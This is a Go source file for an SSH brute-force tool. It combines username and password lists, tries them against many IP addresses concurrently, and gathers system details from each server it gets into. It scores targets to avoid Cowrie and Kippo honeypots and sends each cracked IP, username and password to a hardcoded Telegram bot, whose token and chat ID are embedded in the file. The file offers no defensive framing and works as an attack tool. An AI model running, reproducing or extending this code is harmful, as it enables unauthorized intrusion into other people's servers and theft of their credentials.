package main

import (
	"bufio"
	"fmt"
	"log"
	"math"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	TELEGRAM_BOT_TOKEN = "8225839363:AAFPEdO4WzRRSJDjUdtRnuvsYIz8hHOxEt4"
	TELEGRAM_CHAT_ID   = "6073326628"
	VERSION            = "2.8-LiveStatus"
	CONCURRENT_PER_WORKER = 50
)

var (
	startTime     time.Time
	totalIPCount  int
	stats         = struct{ goods, errors, honeypots int64 }{0, 0, 0}
	ipFile        string
	timeout       int
	maxConnections int
	successfulIPs = make(map[string]struct{})
	mapMutex      sync.Mutex
)

type SSHTask struct {
	IP, Port, Username, Password string
}

type ServerInfo struct {
	IP, Port, Username, Password, SSHVersion, OSInfo, Hostname string
	IsHoneypot                                                 bool
	HoneypotScore                                              int
	ResponseTime                                               time.Duration
	Commands                                                   map[string]string
	OpenPorts                                                  []string
}

type HoneypotDetector struct {
	TimeAnalysis, CommandAnalysis, NetworkAnalysis bool
}

func sendTelegramNotification(message string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TELEGRAM_BOT_TOKEN)
	data := url.Values{}
	data.Set("chat_id", TELEGRAM_CHAT_ID)
	data.Set("text", message)
	data.Set("parse_mode", "Markdown")

	resp, err := http.PostForm(apiURL, data)
	if err != nil {
		log.Printf("Telegram Error: %v", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		log.Printf("Telegram API Error: %s", resp.Status)
	}
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	createComboFile(reader)
	fmt.Print("Enter the IP list file path: ")
	ipFile, _ = reader.ReadString('\n')
	ipFile = strings.TrimSpace(ipFile)

	fmt.Print("Enter the timeout value (seconds): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeout, _ = strconv.Atoi(strings.TrimSpace(timeoutStr))

	maxConnections = runtime.NumCPU()
	fmt.Printf("Optimization: Using %d workers (all available CPU cores).\n", maxConnections)

	startTime = time.Now()
	combos := getItems("combo.txt")
	ips := getItems(ipFile)
	totalIPCount = len(ips) * len(combos)

	if totalIPCount == 0 {
		log.Fatal("IP list or combo list is empty. Exiting.")
	}

	startupMsg := fmt.Sprintf("✅ *Scan Tool v%s Started*\nFile: `%s`\nTimeout: %ds\nWorkers: %d (CPU Cores)\nTotal Checks: %d",
		VERSION, ipFile, timeout, maxConnections, totalIPCount)
	go sendTelegramNotification(startupMsg)

	setupEnhancedWorkerPool(combos, ips)

	finalGoods := atomic.LoadInt64(&stats.goods)
	finalHoneypots := atomic.LoadInt64(&stats.honeypots)
	finalErrors := atomic.LoadInt64(&stats.errors)
	elapsedTime := time.Since(startTime)
	
	finalMsg := fmt.Sprintf("🏁 *Scan Finished!*\nTotal Time: %s\n- Successful: %d\n- Honeypots: %d\n- Failed: %d",
		elapsedTime.Round(time.Second).String(), finalGoods, finalHoneypots, finalErrors)
	sendTelegramNotification(finalMsg)

	fmt.Println("\nOperation completed successfully!")
}

// Hàm mới để gửi ping trạng thái mỗi 10 giây
func telegramPinger() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		goods := atomic.LoadInt64(&stats.goods)
		errors := atomic.LoadInt64(&stats.errors)
		honeypots := atomic.LoadInt64(&stats.honeypots)
		total := int(goods + errors + honeypots)

		if total >= totalIPCount {
			return // Dừng ping khi đã quét xong
		}

		elapsed := time.Since(startTime).Seconds()
		var speed float64
		if elapsed > 0 {
			speed = float64(total) / elapsed
		}

		var percentage float64
		if totalIPCount > 0 {
			percentage = (float64(total) / float64(totalIPCount)) * 100
		}
		
		pingMsg := fmt.Sprintf("⏳ *[PING]* Checked %d/%d (%.1f%%) | Speed: %.1f/s | Hits: %d, Pots: %d",
			total, totalIPCount, percentage, speed, goods, honeypots)
		
		sendTelegramNotification(pingMsg)
	}
}


func getItems(path string) [][]string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Failed to open file '%s': %s", path, err)
	}
	defer file.Close()
	var items [][]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			items = append(items, strings.Split(line, ":"))
		}
	}
	return items
}

func clear() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func createComboFile(reader *bufio.Reader) {
	fmt.Print("Enter the username list file path: ")
	usernameFile, _ := reader.ReadString('\n')
	usernameFile = strings.TrimSpace(usernameFile)
	fmt.Print("Enter the password list file path: ")
	passwordFile, _ := reader.ReadString('\n')
	passwordFile = strings.TrimSpace(passwordFile)

	usernames, passwords := getItems(usernameFile), getItems(passwordFile)
	file, err := os.Create("combo.txt")
	if err != nil {
		log.Fatalf("Failed to create combo file: %s", err)
	}
	defer file.Close()
	for _, user := range usernames {
		for _, pass := range passwords {
			if len(user) > 0 && len(pass) > 0 {
				fmt.Fprintf(file, "%s:%s\n", user[0], pass[0])
			}
		}
	}
}

func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
	commands := map[string]string{
		"hostname": "hostname", "uname": "uname -a", "whoami": "whoami", "pwd": "pwd",
		"ls_root": "ls -la /", "ps": "ps aux | head -10", "netstat": "netstat -tulpn | head -10",
		"history": "history | tail -5", "ssh_version": "ssh -V", "uptime": "uptime",
		"mount": "mount | head -5", "env": "env | head -10",
	}
	for cmdName, cmd := range commands {
		output := executeCommand(client, cmd)
		serverInfo.Commands[cmdName] = output
		switch cmdName {
		case "hostname":
			serverInfo.Hostname = strings.TrimSpace(output)
		case "uname":
			serverInfo.OSInfo = strings.TrimSpace(output)
		case "ssh_version":
			serverInfo.SSHVersion = strings.TrimSpace(output)
		}
	}
	serverInfo.OpenPorts = scanLocalPorts(client)
}

func executeCommand(client *ssh.Client, command string) string {
	session, err := client.NewSession()
	if err != nil { return fmt.Sprintf("ERROR: %v", err) }
	defer session.Close()
	output, err := session.CombinedOutput(command)
	if err != nil { return fmt.Sprintf("ERROR: %v", err) }
	return string(output)
}

func scanLocalPorts(client *ssh.Client) []string {
	output := executeCommand(client, "netstat -tulpn 2>/dev/null | grep LISTEN | head -20")
	var ports []string
	re := regexp.MustCompile(`:(\d+)\s`)
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		matches := re.FindAllStringSubmatch(line, -1)
		for _, match := range matches {
			if len(match) > 1 && !contains(ports, match[1]) {
				ports = append(ports, match[1])
			}
		}
	}
	return ports
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item { return true }
	}
	return false
}

func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *HoneypotDetector) bool {
	score := 0
	score += analyzeCommandOutput(serverInfo)
	if detector.TimeAnalysis { score += analyzeResponseTime(serverInfo) }
	score += analyzeFileSystem(serverInfo)
	score += analyzeProcesses(serverInfo)
	if detector.NetworkAnalysis { score += analyzeNetwork(client) }
	score += behavioralTests(client, serverInfo)
	score += detectAnomalies(serverInfo)
	score += advancedHoneypotTests(client)
	score += performanceTests(client)
	serverInfo.HoneypotScore = score
	return score >= 6
}

func analyzeCommandOutput(serverInfo *ServerInfo) int {
	score := 0
	indicators := []string{"fake", "simulation", "honeypot", "trap", "monitor", "cowrie", "kippo", "artillery", "honeyd"}
	for _, output := range serverInfo.Commands {
		lowerOutput := strings.ToLower(output)
		for _, indicator := range indicators {
			if strings.Contains(lowerOutput, indicator) { score += 3 }
		}
	}
	return score
}

func analyzeResponseTime(serverInfo *ServerInfo) int { if serverInfo.ResponseTime.Milliseconds() < 10 { return 2 }; return 0 }

func analyzeFileSystem(serverInfo *ServerInfo) int {
	score := 0
	lsOutput, ok := serverInfo.Commands["ls_root"]; if !ok { return 0 }
	patterns := []string{"total 0", "total 4", "honeypot", "fake", "simulation"}
	lowerOutput := strings.ToLower(lsOutput)
	for _, pattern := range patterns { if strings.Contains(lowerOutput, pattern) { score++ } }
	if len(strings.Split(strings.TrimSpace(lsOutput), "\n")) < 5 { score++ }
	return score
}

func analyzeProcesses(serverInfo *ServerInfo) int {
	score := 0
	psOutput, ok := serverInfo.Commands["ps"]; if !ok { return 0 }
	processes := []string{"cowrie", "kippo", "honeypot", "honeyd", "artillery", "honeytrap"}
	lowerOutput := strings.ToLower(psOutput)
	for _, process := range processes { if strings.Contains(lowerOutput, process) { score += 2 } }
	if len(strings.Split(strings.TrimSpace(psOutput), "\n")) < 5 { score++ }
	return score
}

func analyzeNetwork(client *ssh.Client) int {
	score := 0
	netConfig := executeCommand(client, "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null")
	if strings.Contains(strings.ToLower(netConfig), "total 0") || strings.Contains(strings.ToLower(netConfig), "no such file") { score++ }
	ifaceCheck := executeCommand(client, "ip addr show 2>/dev/null")
	if strings.Contains(strings.ToLower(ifaceCheck), "fake") || strings.Contains(strings.ToLower(ifaceCheck), "trap") { score++ }
	return score
}

func behavioralTests(client *ssh.Client, serverInfo *ServerInfo) int {
	score := 0
	tmpFile := fmt.Sprintf("/tmp/test_%d", time.Now().UnixNano())
	createOut := executeCommand(client, fmt.Sprintf("echo 'test' > %s", tmpFile))
	if strings.Contains(strings.ToLower(createOut), "permission denied") { score++ } else { executeCommand(client, fmt.Sprintf("rm -f %s", tmpFile)) }
	return score
}

func advancedHoneypotTests(client *ssh.Client) int {
	score := 0
	cpuInfo := executeCommand(client, "cat /proc/cpuinfo | grep 'model name'")
	if strings.Contains(strings.ToLower(cpuInfo), "qemu") || strings.Contains(strings.ToLower(cpuInfo), "virtual") { score++ }
	pmCheck := executeCommand(client, "which apt || which yum || which pacman")
	if len(strings.TrimSpace(pmCheck)) == 0 { score++ }
	internetTest := executeCommand(client, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'")
	if len(strings.TrimSpace(internetTest)) == 0 { score++ }
	return score
}

func performanceTests(client *ssh.Client) int {
	score := 0
	ioTest := executeCommand(client, "time dd if=/dev/zero of=/tmp/test_io bs=1M count=10 2>&1")
	if strings.Contains(ioTest, "command not found") { score++ }
	executeCommand(client, "rm -f /tmp/test_io")
	return score
}

func detectAnomalies(serverInfo *ServerInfo) int {
	score := 0
	suspiciousHostnames := []string{"honeypot", "fake", "trap", "monitor", "sandbox", "test"}
	lowerHostname := strings.ToLower(serverInfo.Hostname)
	for _, suspicious := range suspiciousHostnames { if strings.Contains(lowerHostname, suspicious) { score++ } }
	if uptime, ok := serverInfo.Commands["uptime"]; ok && (strings.Contains(uptime, " min") || strings.Contains(uptime, " 0:")){ score++ }
	if history, ok := serverInfo.Commands["history"]; ok && len(strings.Split(strings.TrimSpace(history), "\n")) < 3 { score++ }
	return score
}

func logSuccessfulConnection(serverInfo *ServerInfo) {
	simpleCreds := fmt.Sprintf("%s:%s@%s:%s\n", serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password)
	appendToFile(simpleCreds, "su-goods.txt")

	firstLineOS := serverInfo.OSInfo
	if strings.Contains(firstLineOS, "\n") { firstLineOS = strings.Split(firstLineOS, "\n")[0] }
	
	compactInfo := fmt.Sprintf("🎯 *[HIT]* `%s:%s` | `%s:%s` | *Host:* %s | *OS:* %s | *Score:* %d",
		serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password,
		serverInfo.Hostname, firstLineOS, serverInfo.HoneypotScore)
	
	appendToFile(compactInfo+"\n", "detailed-results.txt")
	go sendTelegramNotification(compactInfo)

	fmt.Printf("✅ SUCCESS: %s", simpleCreds)
}

func banner() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()
	for range ticker.C {
		goods, errors, honeypots := atomic.LoadInt64(&stats.goods), atomic.LoadInt64(&stats.errors), atomic.LoadInt64(&stats.honeypots)
		total := int(goods + errors + honeypots)
		elapsed := time.Since(startTime).Seconds()
		var speed, remaining float64
		if elapsed > 0 { speed = float64(total) / elapsed }
		if speed > 0 { remaining = float64(totalIPCount-total) / speed }
		
		clear()
		fmt.Printf("================================================\n")
		fmt.Printf("🚀 SSH Brute Force Tool v%s (Live Status) 🚀\n", VERSION)
		fmt.Printf("================================================\n")
		fmt.Printf("File: %s | Timeout: %ds | Workers: %d (CPU Cores)\n", ipFile, timeout, maxConnections)
		fmt.Printf("Checked: %d/%d | Speed: %.2f/s\n", total, totalIPCount, speed)
		if total < totalIPCount && total > 0 {
			fmt.Printf("Elapsed: %s | Remaining: %s\n", formatTime(elapsed), formatTime(remaining))
		}
		fmt.Printf("================================================\n")
		fmt.Printf("Successful: %d | Failed: %d | Honeypots: %d\n", goods, errors, honeypots)
		fmt.Printf("================================================\n")

		if total >= totalIPCount {
			return // Dừng banner khi quét xong
		}
	}
}

func formatTime(seconds float64) string {
	if math.IsNaN(seconds) || math.IsInf(seconds, 0) { return "..." }
	d := time.Duration(seconds) * time.Second
	d = d.Round(time.Second)
	h, m, s := d/time.Hour, (d%time.Hour)/time.Minute, (d%time.Minute)/time.Second
	return fmt.Sprintf("%02d:%02d:%02d", h, m, s)
}

func appendToFile(data, filepath string) {
	f, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil { return }
	defer f.Close()
	f.WriteString(data)
}

func setupEnhancedWorkerPool(combos, ips [][]string) {
	taskQueue := make(chan SSHTask, maxConnections*CONCURRENT_PER_WORKER)
	var wg sync.WaitGroup
	for i := 0; i < maxConnections; i++ {
		wg.Add(1)
		go enhancedMainWorker(i, taskQueue, &wg)
	}
	go banner()
	go telegramPinger() // Bắt đầu gửi ping trạng thái
	
	go func() {
		for _, combo := range combos {
			for _, ip := range ips {
				if len(combo) > 1 && len(ip) > 1 {
					taskQueue <- SSHTask{ip[0], ip[1], combo[0], combo[1]}
				}
			}
		}
		close(taskQueue)
	}()
	wg.Wait()
}

func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, wg *sync.WaitGroup) {
	defer wg.Done()
	sem := make(chan struct{}, CONCURRENT_PER_WORKER)
	var workerWg sync.WaitGroup
	for task := range taskQueue {
		workerWg.Add(1)
		sem <- struct{}{}
		go func(t SSHTask) {
			defer workerWg.Done()
			processSSHTask(t)
			<-sem
		}(task)
	}
	workerWg.Wait()
}

func processSSHTask(task SSHTask) {
	config := &ssh.ClientConfig{
		User: task.Username, Auth: []ssh.AuthMethod{ssh.Password(task.Password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), Timeout: time.Duration(timeout) * time.Second,
	}
	connStartTime := time.Now()
	client, err := ssh.Dial("tcp", task.IP+":"+task.Port, config)
	if err == nil {
		defer client.Close()
		serverInfo := &ServerInfo{
			IP: task.IP, Port: task.Port, Username: task.Username, Password: task.Password,
			ResponseTime: time.Since(connStartTime), Commands: make(map[string]string),
		}
		detector := &HoneypotDetector{TimeAnalysis: true, CommandAnalysis: true, NetworkAnalysis: true}
		gatherSystemInfo(client, serverInfo)
		serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)

		successKey := fmt.Sprintf("%s:%s", serverInfo.IP, serverInfo.Port)
		mapMutex.Lock()
		defer mapMutex.Unlock()
		if _, exists := successfulIPs[successKey]; !exists {
			successfulIPs[successKey] = struct{}{}
			if !serverInfo.IsHoneypot {
				atomic.AddInt64(&stats.goods, 1)
				logSuccessfulConnection(serverInfo)
			} else {
				atomic.AddInt64(&stats.honeypots, 1)
				honeypotMsg := fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n",
					serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore)
				appendToFile(honeypotMsg, "honeypots.txt")
			}
		}
	} else {
		atomic.AddInt64(&stats.errors, 1)
	}
}
